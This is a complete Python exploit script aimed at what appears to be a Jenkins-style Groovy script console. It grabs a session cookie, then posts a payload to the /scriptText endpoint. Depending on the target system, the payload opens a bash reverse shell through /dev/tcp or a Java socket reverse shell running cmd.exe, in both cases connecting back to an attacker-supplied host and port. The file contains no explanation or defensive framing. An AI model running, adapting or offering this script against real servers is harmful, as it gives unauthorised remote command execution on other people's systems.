import requests
import json
import sys
target = sys.argv[1]
port_target = sys.argv[2]
lhost = sys.argv[3]
lport = sys.argv[4]
target_system = input("System of target: Linux or Windows: ")

session = requests.Session()
session.get("http://" + target + ":" + port_target)
cookies_session = session.cookies.get_dict()
cookie = json.dumps(cookies_session)
cookie = cookie.replace('"}','')
cookie = cookie.replace('{"', '')
cookie = cookie.replace('"', '')
cookie = cookie.replace(" ", '')
cookie = cookie.replace(":", '=')

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "877",
    "Origin": "http://" + target,
    "DNT": "1",
    "Connection": "close",
    "Referer": "http://" + target + "/script",
    "Cookie": cookie + "; screenResolution=1000x700",
    "Upgrade-Insecure-Requests": "1",
    "Sec-GPC": "1"
}

if target_system == "Linux":
    body = {
        "script": """
                r = Runtime.getRuntime()
                p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
                p.waitFor()    
                """ % (lhost,lport)
    }
if target_system == "Windows":
    body = {
        "script": '''
                String host="%s";
                int port=%s;
                String cmd="cmd.exe";
                Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
                ''' % (lhost, lport)
    }




x = requests.post("http://" + target + ':' + port_target + '/scriptText', headers=headers, data=body)
print(x.text)
